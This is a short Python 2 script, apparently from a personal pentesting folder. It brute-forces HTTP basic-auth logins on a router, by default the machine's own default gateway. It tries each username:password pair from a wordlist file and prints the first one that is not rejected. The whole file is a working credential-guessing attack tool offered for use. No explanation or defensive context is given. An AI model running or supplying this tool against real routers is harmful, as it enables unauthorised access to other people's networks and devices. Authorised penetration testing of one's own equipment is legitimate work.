#!/usr/bin/python
import requests,socket,sys,os

## VARIABLES ##

global TARGET_IPv4

## FUNCTIONS ##

def getGateway():
	return str(os.popen("route -n | grep 'UG' | awk  '{print $2}'").read().rstrip("\r\n"))

def checkHost(host):
	socket.setdefaulttimeout(2)
	s = socket.socket()
	try:
		s.connect((str(host),80))
	except:
		return False

def bruteRouter(host,passFile):
	f = open(passFile,"r")
	for line in f.readlines():
		username = line.split(":")[0]
		password = line.split(":")[1]
		if username == "n/a":
			username = ""
		if password == "n/a":
			password = ""
		re = requests.get("http://"+host,auth=(username,password))
		if re.status_code == 401:
			pass
		else:
			print "Host : "+host+"\nUsername : "+username+"\nPassword : "+password
			exit(0)
	print "Brute force of gateway credentials against "+host+" failed."

## MAIN ##

if __name__ == '__main__':
	if os.getuid() != 0:
		print "You must be root to run this script."
		exit(1)

	try:
		TARGET_IPv4 = socket.gethostbyname(str(sys.argv[1]))
	except:	
		TARGET_IPv4 = getGateway()

	if TARGET_IPv4 != getGateway():
		if checkHost(TARGET_IPv4) != False:
			print "Brute forcing credentails for "+TARGET_IPv4+"."
			bruteRouter(TARGET_IPv4,"/home/sysadmin/frey/placebo/pentesting/routerpasswords.txt")
		else:
			print TARGET_IPv4+" is not serving on port 80 or is down."
			exit(1)
	elif TARGET_IPv4 == getGateway():
		if checkHost(TARGET_IPv4) != False:
			print "Brute forcing crednetials for "+TARGET_IPv4+" (Default gateway)."
			bruteRouter(TARGET_IPv4,"/home/sysadmin/frey/placebo/pentesting/routerpasswords.txt")
		else:
			print "Gateway : "+TARGET_IPv4+" is not serving on port 80."
			exit(1)
	else:
		print "Error."
		exit(1)
